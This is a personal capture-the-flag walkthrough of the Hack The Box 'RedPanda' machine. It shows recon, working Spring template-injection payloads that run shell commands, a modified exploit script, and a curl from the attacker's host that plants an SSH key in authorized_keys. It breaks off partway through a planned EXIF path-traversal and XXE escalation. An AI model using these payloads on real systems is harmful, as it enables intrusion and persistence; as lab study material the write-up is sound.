# [01 - RedPanda](https://app.hackthebox.com/machines/RedPanda)

  * [description](#description)
  * [walkthrough](#walkthrough)
    * [recon](#recon)
    * [8080](#8080)
    * [back again](#back-again)
    * [ssti](#ssti)
    * [coming back](#coming-back)
    * [the next step](#the-next-step)
    * [code auditing ftw](#code-auditing-ftw)
  * [flag](#flag)
## description
> 10.129.193.227

![RedPanda.png](RedPanda.png)

## walkthrough

### recon

```
$ nmap -sV -sC -A -Pn -p- redpanda.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-10 10:45 MDT
Nmap scan report for redpanda.htb (10.129.193.227)
Host is up (0.061s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sun, 10 Jul 2022 16:45:43 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sun, 10 Jul 2022 16:45:43 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 10 Jul 2022 16:45:43 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot

```


### 8080

```
POST /search HTTP/1.1
Host: redpanda.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://redpanda.htb:8080
Connection: close
Referer: http://redpanda.htb:8080/
Upgrade-Insecure-Requests: 1

name=red+panda
```

interestingly, 404 response for `favicon.ico` was MIME-type JSON:
```
HTTP/1.1 404
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Content-Type: application/json
Date: Sun, 10 Jul 2022 16:47:03 GMT
Connection: close
Content-Length: 113

{"timestamp":"2022-07-10T16:47:03.858+00:00","status":404,"error":"Not Found","message":"","path":"/favicon.ico"}
```

gobuster or sqlmap?

does ther fact that this is powered by springboot push us in one direction or the other?

sqlmap didn't find anything

gobuster found 2 new routes using `common.txt`
```
/error                (Status: 500) [Size: 86]
/search               (Status: 405) [Size: 117]
/stats                (Status: 200) [Size: 987]
```

/error is a whitelabel endpoint, so.. stats it is.

```
Please choose an author to view statistics for

woodenk

damian

With every view an author gets for their red panda image, they are awarded with 1 creditpoint. These eventually lead up to a bigger payout bonus for their content
```


http://redpanda.htb:8080/stats?author=woodenk

gives us
```
woodenk

Panda URI 	Panda views
/img/greg.jpg 	0
/img/hungy.jpg 	0
/img/smooch.jpg 	0
/img/smiley.jpg 	0
Total views: 0

Export table
```

and

```
damian
Panda URI 	Panda views
/img/angy.jpg 	0
/img/shy.jpg 	0
/img/crafty.jpg 	0
/img/peter.jpg 	0
Total views: 0
```

the export table link points at `http://redpanda.htb:8080/export.xml?author=damian`

raw wget of export.xml gives
```
$ cat export.xml
Error, incorrect paramenter 'author'
```

`http://redpanda.htb:8080/img/angy.jpg` is indeed a picture of a red panda


gobuster vhost looking for subdomains

```
Found: gc._msdcs (Status: 400) [Size: 435]
Found: _domainkey (Status: 400) [Size: 435]
Found: mailing._domainkey.sunnynews (Status: 400) [Size: 435]
Found: mailing._domainkey.info (Status: 400) [Size: 435]
Found: hallam_dev (Status: 400) [Size: 435]
Found: hallam_ad (Status: 400) [Size: 435]
Found: wm_j_b__ruffin (Status: 400) [Size: 435]
Found: 2609_n_www (Status: 400) [Size: 435]
Found: 0907_n_hn.m (Status: 400) [Size: 435]
Found: 0507_n_hn (Status: 400) [Size: 435]
Found: faitspare_mbp.cit (Status: 400) [Size: 435]
Found: sb_0601388345bc6cd8 (Status: 400) [Size: 435]
Found: sb_0601388345bc450b (Status: 400) [Size: 435]
Found: api_portal_dev (Status: 400) [Size: 435]
Found: api_web_dev (Status: 400) [Size: 435]
Found: api_webi_dev (Status: 400) [Size: 435]
Found: sklep_test (Status: 400) [Size: 435]
```

a lot of those look like garbage, but `api_portal_dev` and `api_web_dev` look like they might be real

back to search - searched with `name=`, and got

```
You searched for: Greg
There are 1 results for your search
Panda name:
Greg
Panda bio:
Greg is a hacker. Watch out for his injection attacks!
```

so, search for the filenames without extension
`hungy`

'greg' seems to be the only result with a relevant bio - given that it is pointing at injection, going back to sqlmap


while waiting for `--level 3` scans to complete, trying to figure out why the stats page isn't being updated as expected.

```
$ curl -X POST http://redpanda.htb:8080/stats?author=damian -d '{"uri":"/img/angy.jpg"}'
{"timestamp":"2022-07-10T17:45:18.181+00:00","status":405,"error":"Method Not Allowed","message":"","path":"/stats"}
```

### back again

wrote [caller.rb](caller.rb) to see if there were other names we were missing,
```
$ ruby caller.rb
total names[18240]
name[angy] found
name[peter] found
name[greg] found
```

didn't find anything new.

POSTing `/search name=greg%2526shards%3Dhttp%3A%2F%2F10.129.192.103%2Fsolr` afer reading [https://github.com/veracode-research/solr-injection](https://github.com/veracode-research/solr-injection), [specifically](https://github.com/veracode-research/solr-injection#black-box-detection)

and got a different response
> You searched for: Error occured: banned characters


so without `%`, can't think of any encoding attacks, which pushes us back to SQLi.

quick segue to SSTI, but tplmap comes up empty
```
$ tplmap.py -u http://redpanda.htb:8080/export.xml?author=foo
Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

Testing if GET parameter 'author' is injectable
Smarty plugin is testing rendering with tag '*'
Smarty plugin is testing blind injection
Mako plugin is testing rendering with tag '${*}'
Mako plugin is testing blind injection
Python plugin is testing rendering with tag 'str(*)'
Python plugin is testing blind injection
Tornado plugin is testing rendering with tag '{{*}}'
Tornado plugin is testing blind injection
Jinja2 plugin is testing rendering with tag '{{*}}'
Jinja2 plugin is testing blind injection
Twig plugin is testing rendering with tag '{{*}}'
Twig plugin is testing blind injection
Exiting: 'bool' object has no attribute 'replace'
```

same for `http://redpanda.htb:8080/stats?author=foo`. try POST on /search?

worth a shot, but no luck `-u http://redpanda.htb:8080/search -X POST -d 'name=foo'`

still feels like ssti is the path forward. reading forum, confirmed.

### ssti

eventually got to `#{7*7}`, which returned `You searched for: ??49_en_US??`

`#{{7*7}}` gets to `You searched for: ??{7*7}_en_US??`, so still leaking data, but not actually what we're looking for

```
$ curl http://redpanda.htb:8080/search -X POST -d 'name=@{7*7}'
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Red Panda Search | Made with Spring Boot</title>
    <link rel="stylesheet" href="css/search.css">
  </head>
  <body>
    <form action="/search" method="POST">
    <div class="wrap">
      <div class="search">
        <input type="text" name="name" placeholder="Search for a red panda">
        <button type="submit" class="searchButton">
          <i class="fa fa-search"></i>
        </button>
      </div>
    </div>
  </form>
    <div class="wrapper">
  <div class="results">
    <h2 class="searched">You searched for: 49</h2>
      <h2>There are 0 results for your search</h2>

    </div>
    </div>

  </body>
</html>
```

so an `@{}` wrapped query is getting only what we want, no `_en_us`

we can make '+' math work by encoding `+` ourselves, otherwise it is interpreted as a space

but beyond basic math, can't get anything to work - and tplmap is empty even with `--level 5`.. which makes this feel like a very specific templating engine

```
$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{T()}'
...
    <h2 class="searched">You searched for: #{T()}</h2>
      <h2>There are 0 results for your search</h2>
```
no injection

```
$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{{T()}}'
...
    <h2 class="searched">You searched for: ??{T()}_en_US??</h2>
      <h2>There are 0 results for your search</h2>
```

if not injection, at least modification

```
$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{{7*7}}'
...
    <h2 class="searched">You searched for: ??{7*7}_en_US??</h2>
      <h2>There are 0 results for your search</h2>
```

so not injection

```
$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{7*7}'
    <h2 class="searched">You searched for: ??49_en_US??</h2>
      <h2>There are 0 results for your search</h2>
```
injection



need to figure out what the engine is before continuing to shoot in the dark

### coming back

took down [trick](https://github.com/chorankates/ctf/tree/master/hackthebox.eu/machines/37-Trick) this morning, trying to ride that.

still need to identify the engine - searching just "spring boot ssti", the first link is for [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

this identifies 5 different expression types:
```
${...}: Variable expressions – in practice, these are OGNL or Spring EL expressions.
*{...}: Selection expressions – similar to variable expressions but used for specific purposes.
#{...}: Message (i18n) expressions – used for internationalization.
@{...}: Link (URL) expressions – used to set correct URLs/paths in the application.
~{...}: Fragment expressions – they let you reuse parts of templates.
```

and we can get `*`, `#` and `@` prefixed simple `{8*8}` expressions to work for all of them


[https://www.baeldung.com/spring-template-engines](https://www.baeldung.com/spring-template-engines):
> as well as the main template engines that can be used with Spring: Thymeleaf, Groovy, FreeMarker, Jade.

interesting that didn't mention `Expression Language EL`, because from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection),
> Expression Language EL - Basic injection
> ${1+1}
> #{1+1}


wrote [searcher.rb](searcher.rb) and populated with more PATT content in [sstis](sstis)

while playing with `def exploder()`, go to `Jinjava`, which

```
[38] pry(main)> search("*{{'a'.toUpperCase()}}")
=> "A"
```

finally something more powerful than arithmetic

```
[39] pry(main)> search("*{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}")
=> {"timestamp"=>"2022-07-17T19:02:16.906+00:00", "status"=>500, "error"=>"Internal Server Error", "message"=>"", "path"=>"/search"}
[40] pry(main)> search("*{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}")
=> "xxx"
```

we're definitely executing java, not javascript, as proven by:
```
[81] pry(main)> search("*{{'fooo'.charCodeAt(3)}}")
=> {"timestamp"=>"2022-07-17T19:19:27.860+00:00", "status"=>500, "error"=>"Internal Server Error", "message"=>"", "path"=>"/search"}
[82] pry(main)> search("*{{'fooo'.charAt(3)}}")
=> "o"
```

`charAt` => Java, `charCodeAt` => JavaScript


and finally, get to [https://github.com/VikasVarshney/ssti-payload](https://github.com/VikasVarshney/ssti-payload), which gets us to

```
[120] pry(main)> search('%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%28119%29.concat%28T%28java.lang.Character%29.toString%28104%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28105%29%29%29.getInputStream%28%29%29%7D')
=> "Error occured: banned characters"
[121] pry(main)> 0x24.chr
=> "$"
[122] pry(main)> '*'.ord.to_s(16)
=> "2a"
[123] pry(main)> search('%2A%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%28119%29.concat%28T%28java.lang.Character%29.toString%28104%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28105%29%29%29.getInputStream%28%29%29%7D')

From: /home/conor/git/ctf-meta/htb/machines/03-RedPanda/searcher.rb:32 Object#search:

    16: def search(term)
    17:   uri = URI.parse(BASE_URL)
    18:
    19:   http = Net::HTTP.new(uri.host, uri.port)
    20:
    21:   request = Net::HTTP::Post.new(uri.request_uri)
    22:   request.body = sprintf('name=%s', term)
    23:   request['Content-Type'] = 'application/x-www-form-urlencoded'
    24:
    25:   response = http.request(request)
    26:
    27:   if response.code.eql?('200')
    28:     if response.body.match(RESPONSE_MATCHER)
    29:       return $1
    30:     end
    31:
 => 32:     binding.pry
    33:   else
    34:     return JSON.parse(response.body)
    35:   end
    36:
    37:   binding.pry
    38: end

[1] pry(main)> response.body
=> "<!DOCTYPE html>\n<html lang=\"en\" dir=\"ltr\">\n  <head>\n    <meta charset=\"utf-8\">\n    <title>Red Panda Search | Made with Spring Boot</title>\n    <link rel=\"stylesheet\" href=\"css/search.css\">\n  </head>\n  <body>\n    <form action=\"/search\" method=\"POST\">\n    <div class=\"wrap\">\n      <div class=\"search\">\n        <input type=\"text\" name=\"name\" placeholder=\"Search for a red panda\">\n        <button type=\"submit\" class=\"searchButton\">\n          <i class=\"fa fa-search\"></i>\n        </button>\n      </div>\n    </div>\n  </form>\n    <div class=\"wrapper\">\n  <div class=\"results\">\n    <h2 class=\"searched\">You searched for: woodenk\n</h2>\n      <h2>There are 0 results for your search</h2>\n       \n    </div>\n    </div>\n    \n  </body>\n</html>\n"
```

output that matters `You searched for: woodenk\n`, this was an encoded `whoami` command

```
$ python ssti-payload.py -u
Command ==> cat /home/woodenk/user.txt

%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28104%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28110%29%29.concat%28T%28java.lang.Character%29.toString%28107%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28117%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28114%29%29.concat%28T%28java.lang.Character%29.toString%2846%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%28120%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29%29.getInputStream%28%29%29%7D
```

which gets us to..

`<h2 class="searched">You searched for: 324c9fbcbc65d4032c4bda715a4955dc`

awwwwwww yeah.


now to pop a shell. this is a pain.

2 minor modifications to `ssti-skel.py`, and
```
$ gd
diff --git a/ssti-skel.py b/ssti-skel.py
index ab1d2d1..f6c7661 100644
--- a/ssti-skel.py
+++ b/ssti-skel.py
@@ -36,7 +36,7 @@ class Terminal(Cmd):
                for i in command:
                        decimals.append(str(ord(i)))

-               payload='''${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
+               payload='''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]


                for i in decimals[1:]:
@@ -63,7 +63,7 @@ class Terminal(Cmd):
                headers = {} #This usually has to be added but there is a Burp extension to convert burp headers into python request headers.
                debug('Headers: ',str(headers))
                try:
-                       response=requests.get(url, headers=headers)
+                       response=requests.post(url, headers=headers)
                        output=response.text
                        #The next line is used to parse out the output, this might be clean but it also may need work. Depends on the vuln.


```


```
[21:20:41] ==> mkdir /home/woodenk/.ssh
[21:20:41] ==> ls -la /home/woodenk/.ssh
[21:20:41] ==> curl http://10.10.14.9:8000/redpanda.pub -o /home/woodenk/.ssh/authorized_keys
```

and..

```
$ ssh -l woodenk -i redpanda redpanda.htb
Warning: Permanently added 'redpanda.htb,10.10.11.170' (ECDSA) to the list of known hosts.
woodenk@redpanda.htb's password:
```

even after making it `0600`, and `chgrp woodenk`, still no love

ok, sticking with this shell for now.

```
[21:20:41] ==> ps aux
root         611  0.0  0.8 214660 17996 ?        SLsl Jul16   0:08 /sbin/multipathd -d -s
systemd+     632  0.0  0.2  90872  6088 ?        Ssl  Jul16   0:06 /lib/systemd/systemd-timesyncd
root         647  0.0  0.5  47540 10712 ?        Ss   Jul16   0:00 /usr/bin/VGAuthService
root         649  0.0  0.4 311504  8404 ?        Ssl  Jul16   1:24 /usr/bin/vmtoolsd
root         664  0.0  0.2  99896  5744 ?        Ssl  Jul16   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         683  0.0  0.4 239292  9328 ?        Ssl  Jul16   0:01 /usr/lib/accountsservice/accounts-daemon
message+     684  0.0  0.2   7380  4432 ?        Ss   Jul16   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         707  0.0  0.1  81956  3852 ?        Ssl  Jul16   0:03 /usr/sbin/irqbalance --foreground
root         708  0.0  0.4 236436  9072 ?        Ssl  Jul16   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog       716  0.0  0.2 224344  5136 ?        Ssl  Jul16   0:00 /usr/sbin/rsyslogd -n -iNONE
root         722  0.0  0.2  17124  5932 ?        Ss   Jul16   0:00 /lib/systemd/systemd-logind
root         726  0.0  0.6 395484 13548 ?        Ssl  Jul16   0:00 /usr/lib/udisks2/udisksd
root         749  0.0  0.6 318816 13448 ?        Ssl  Jul16   0:00 /usr/sbin/ModemManager
systemd+     813  0.0  0.6  24696 13128 ?        Ss   Jul16   0:10 /lib/systemd/systemd-resolved
root         856  0.0  0.1   6812  3056 ?        Ss   Jul16   0:00 /usr/sbin/cron -f
root         860  0.0  0.1   8356  3356 ?        S    Jul16   0:00 /usr/sbin/CRON -f
daemon       861  0.0  0.1   3792  2300 ?        Ss   Jul16   0:00 /usr/sbin/atd -f
root         862  0.0  0.0   2608   592 ?        Ss   Jul16   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         863  0.0  0.2   9420  4588 ?        S    Jul16   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         869  0.0  0.3  12172  7336 ?        Ss   Jul16   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
woodenk      871  0.2 13.0 3112828 265508 ?      Sl   Jul16   3:12 java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         882  0.0  0.0   5828  1848 tty1     Ss+  Jul16   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
mysql        912  0.1 21.7 1819240 442252 ?      Ssl  Jul16   2:48 /usr/sbin/mysqld
root        1742  0.0  0.0      0     0 ?        I    Jul16   0:23 [kworker/0:0-events]
root       12297  0.0  0.0      0     0 ?        I    10:28   0:27 [kworker/0:1-events]
root       17359  0.0  0.0      0     0 ?        I    16:39   0:02 [kworker/1:2-events]
root       20591  0.0  0.0      0     0 ?        I    20:23   0:00 [kworker/u4:0-events_power_efficient]
root       21104  0.0  0.0      0     0 ?        I    21:00   0:00 [kworker/u4:1-events_power_efficient]
root       21253  0.0  0.0      0     0 ?        I    21:10   0:00 [kworker/1:1-events]
root       21526  0.0  0.0      0     0 ?        I    21:28   0:00 [kworker/u4:2-events_power_efficient]
woodenk    21529  0.0  0.1   8888  3248 ?        R    21:28   0:00 ps aux
```

grab the jar and reverse it?

```
[21:20:41] ==> ls -la /opt
drwxr-xr-x  5 root root 4096 Jun 23 18:12 .
drwxr-xr-x 20 root root 4096 Jun 23 14:52 ..
-rwxr-xr-x  1 root root  462 Jun 23 18:12 cleanup.sh
drwxr-xr-x  3 root root 4096 Jun 14 14:35 credit-score
drwxr-xr-x  6 root root 4096 Jun 14 14:35 maven
drwxrwxr-x  5 root root 4096 Jun 14 14:35 panda_search
</h2>
```

hmm - is `credit-score` another site? what's `cleanup.sh`?

```
[21:20:41] ==> cat /opt/cleanup.sh
/usr/bin/find /tmp -name &quot;*.xml&quot; -exec rm -rf {} \;
/usr/bin/find /var/tmp -name &quot;*.xml&quot; -exec rm -rf {} \;
/usr/bin/find /dev/shm -name &quot;*.xml&quot; -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name &quot;*.xml&quot; -exec rm -rf {} \;
/usr/bin/find /tmp -name &quot;*.jpg&quot; -exec rm -rf {} \;
/usr/bin/find /var/tmp -name &quot;*.jpg&quot; -exec rm -rf {} \;
/usr/bin/find /dev/shm -name &quot;*.jpg&quot; -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name &quot;*.jpg&quot; -exec rm -rf {} \;
```

removing `jpg` and `xml` from `/home/woodenk`?

taking a quick sidetrack to get `panda_search-0.0.1-SNAPSHOT.jar` - see the html that drives the site, and the red panda images, but think we've gotten what we need out of it

and also
```
[21:55:10] ==> cp /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar .
```

```java
public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap();
        map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        return map;
    }

    public static boolean isImage(String filename) {
        if (filename.contains(".jpg")) {
            return true;
        }
        return false;
    }

    public static String getArtist(String uri) throws IOException, JpegProcessingException {
        for (Directory dir : JpegMetadataReader.readMetadata(new File("/opt/panda_search/src/main/resources/static" + uri)).getDirectories()) {
            Iterator<Tag> it = dir.getTags().iterator();
            while (true) {
                if (it.hasNext()) {
                    Tag tag = it.next();
                    if (tag.getTagName() == "Artist") {
                        return tag.getDescription();
                    }
                }
            }
        }
        return "N/A";
    }

    public static void addViewTo(String path, String uri) throws JDOMException, IOException {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());
        File fd = new File(path);
        Document doc = saxBuilder.build(fd);
        Element rootElement = doc.getRootElement();
        for (Element el : rootElement.getChildren()) {
            if (el.getName() == "image" && el.getChild("uri").getText().equals(uri)) {
                Integer totalviews = Integer.valueOf(Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1);
                System.out.println("Total views:" + Integer.toString(totalviews.intValue()));
                rootElement.getChild("totalviews").setText(Integer.toString(totalviews.intValue()));
                el.getChild("views").setText(Integer.toString(Integer.valueOf(Integer.parseInt(el.getChild("views").getText())).intValue() + 1));
            }
        }
        xmlOutput.output(doc, new BufferedWriter(new FileWriter(fd)));
    }

    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        Scanner log_reader = new Scanner(new File("/opt/panda_search/redpanda.log"));
        while (log_reader.hasNextLine()) {
            String line = log_reader.nextLine();
            if (isImage(line)) {
                Map parsed_data = parseLog(line);
                System.out.println(parsed_data.get("uri"));
                String artist = getArtist(parsed_data.get("uri").toString());
                System.out.println("Artist: " + artist);
                addViewTo("/credits/" + artist + "_creds.xml", parsed_data.get("uri").toString());
            }
        }
    }
}
```

so the JPGs are where we expected them based on the jar.

also see that `/opt/panda_search/redpanda.log` is used statically

... while looking around for that, noticed that umask is `0755`, which is a problem for .ssh.. setting it to `0700`

```
$ ssh -i redpanda -l woodenk redpanda.htb
Warning: Permanently added 'redpanda.htb,10.10.11.170' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 17 Jul 2022 10:01:41 PM UTC

  System load:           0.56
  Usage of /:            81.3% of 4.30GB
  Memory usage:          42%
  Swap usage:            0%
  Processes:             213
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.170
  IPv6 address for eth0: dead:beef::250:56ff:feb9:e77d


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul  5 05:51:25 2022 from 10.10.14.23
woodenk@redpanda:~$
```

a real shell.

kicking linpeas

```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560


╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk
sda
sda1
sda2
sda3


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::8080                 :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -

╔══════════╣ Unexpected in root
/credits

```


```
woodenk@redpanda:~$ ls -la /credits/
ls: cannot open directory '/credits/': Permission denied
woodenk@redpanda:~$ ls -ld /credits/
drw-r-x--- 2 root logs 4096 Jun 21 12:32 /credits/
```

the CVE looks like a red herring as
```
woodenk@redpanda:~$ bash poc.sh

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as ubuntu
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[x] ERROR: Accounts service and Gnome-Control-Center NOT found!!
[!]  Aborting Execution!
```

pkiexec is here, dbus is running - so a later version of the exploit might work.

but.. given `cleanup.sh`, think this is about poisoning JPG metadata

```
$ meta_exif greg.jpg
...
JPEG APP1 (52 bytes):
  ExifByteOrder = MM
  + [IFD0 directory with 2 entries]
  | 0)  Orientation = 1
  | 1)  Artist = woodenk
```

that's why it's cleaning up `jpg`, and the last few line of `main()` that parses the redpanda.log
```
addViewTo("/credits/" + artist + "_creds.xml", parsed_data.get("uri").toString());
```

we can obviously control `artist`


and after searching for 'greg',
```
[21:55:10] ==> cat /opt/panda_search/redpanda.log
200||10.10.14.9||Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0||/
304||10.10.14.9||Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0||/css/main.css
304||10.10.14.9||Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0||/css/panda.css
200||10.10.14.9||Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0||/search
200||10.10.14.9||Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0||/css/search.css
304||10.10.14.9||Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0||/img/greg.jpg
```

### the next step

it feels like the plan goes like this:
  * stuff a path traversal link in `redpanda.log` that points to a `jpg` we control (base path `/opt/panda_search/src/main/resources/static`
  * build a `jpg` in that location that has an `artist` exif tag that is also a path traversal (base path `/credits/ + #{artist} + _creds.xml`
  * [fuzzier] use XXE to get `/root/root.txt`


built [foo.jpg](foo.jpg)

```
$ meta_exif foo.jpg
...
JPEG APP1 (106 bytes):
  ExifByteOrder = MM
  + [IFD0 directory with 3 entries]
  | 0)  Orientation = 1
  | 1)  Artist = ../foo
  | 2)  ExifOffset (SubDirectory) -->
```

and ran `$ curl http://redpanda.htb:8080/../../../../../home/woodenk/foo.jpg`, which led to


```
woodenk@redpanda:~$ tail -f /opt/panda_search/redpanda.log

404||10.10.14.9||curl/7.74.0||/home/woodenk/foo.jpg
404||10.10.14.9||curl/7.74.0||/error

```

but the path traversal didn't make it to the logs

`$ curl http://redpanda.htb:8080/..././..././..././..././..././home/woodenk/foo.jpg`

gets

```
404||10.10.14.9||curl/7.74.0||/.../.../.../.../.../home/woodenk/foo.jpg
